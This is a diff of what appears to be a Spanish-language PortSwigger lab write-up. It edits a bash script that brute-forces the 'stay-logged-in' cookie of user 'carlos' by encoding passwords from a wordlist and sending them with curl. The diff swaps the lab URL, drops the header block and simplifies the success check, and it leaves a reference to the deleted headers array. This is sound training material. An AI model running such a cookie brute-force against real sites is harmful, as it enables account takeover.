@@ -47,7 +47,7 @@ We can perform the same attack using a `bash` script:
 ```bash
 #!/bin/bash
 
-url="https://0a1000a3041a58d888ed1b57003c00e2.web-security-academy.net/my-account"
+url="https://0a1000b60346ebed84e4d2e5004c0041.web-security-academy.net/my-account"
 password_file="passwords.txt"
 user="carlos"
 
@@ -66,35 +66,17 @@ generate_encoded_value() {
     echo "$encoded_value"
 }
 
-headers=(
-    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
-    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8"
-    -H "Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3"
-    -H "Accept-Encoding: gzip, deflate, br"
-    -H "Referer: https://0a7f00c6031e1f6f8277ec00004a002d.web-security-academy.net/login"
-    -H "Upgrade-Insecure-Requests: 1"
-    -H "Sec-Fetch-Dest: document"
-    -H "Sec-Fetch-Mode: navigate"
-    -H "Sec-Fetch-Site: same-origin"
-    -H "Sec-Fetch-User: ?1"
-    -H "Priority: u=0, i"
-    -H "Te: trailers"
-)
-
 while read -r password; do
     # Ignorar líneas vacías
     [[ -z "$password" ]] && continue
 
-    # Generar cookie stay-logged-in
     encoded_value=$(generate_encoded_value "$password")
 
-    # Enviar la solicitud con curl
     response=$(curl -s -w "%{http_code}" -o response.html "${headers[@]}" \
         -b "stay-logged-in=$encoded_value; Session=" \
         -G "$url" --data-urlencode "id=$user")
 
-    # Verificar si la respuesta contiene "Bienvenido"
-    if grep -q "Bienvenido" response.html || [[ $response -eq 200 ]]; then
+    if [[ $response -eq 200 ]]; then
         echo -e "\nPassword: $password"
         echo "Cookie stay-logged-in: $encoded_value"
         break
